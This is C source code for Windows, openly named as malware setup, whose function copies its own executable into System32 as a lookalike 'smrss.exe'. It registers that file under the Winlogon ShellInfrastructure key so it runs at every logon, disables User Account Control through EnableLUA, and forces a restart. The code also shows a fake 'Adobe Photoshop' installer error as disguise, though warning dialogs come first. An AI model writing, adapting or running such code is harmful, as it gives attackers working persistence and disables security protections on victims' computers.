#include "setup.h"
#include "tools.h"
#include "registry.h"

BOOL DoWarnings(){
    if(MessageBoxW(NULL, L"This does no good for you, continue?", L"!! Warning !! ", MB_YESNO | MB_ICONWARNING) == IDYES){
        if(MessageBoxW(NULL, L"This will only do harm to your PC\n\n  you sure about this?", L"!! Warning !!", MB_YESNO | MB_ICONWARNING) == IDYES){
            return TRUE;
        }
        else return FALSE;
    }
    else return FALSE;
}


BOOL SetupSystemForMalware(){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile("C:\\Windows\\System32\\ntoskrnl.ini", &OpenBuff, OF_CREATE);
    if(file == HFILE_ERROR){
        InstallerError(L"Failed Starting Installation Of Adobe Photoshop");
        return FALSE;
    }
    LPSTR path = (LPSTR)AllocateVirtualMemory(5097);
    GetModuleFileName(NULL, path, 5096);
    if(!CopyFile(path, "C:\\Windows\\System32\\smrss.exe", FALSE)){
        MessageBoxW(NULL, L"Failed Copying File", L"Installer", MB_OK | MB_ICONERROR);
        FreeVirtualMemory(path);
        return FALSE;
    }
    FreeVirtualMemory(path);
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 
                    L"ShellInfrastructure", REG_SZ, L"C:\\Windows\\System32\\smrss.exe");
    DWORD value = 0;
    WriteIntoRegistry(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 
                    L"EnableLUA", REG_DWORD, &value);

    Sleep(10000);
    
    RestartSystem();
    return TRUE;
}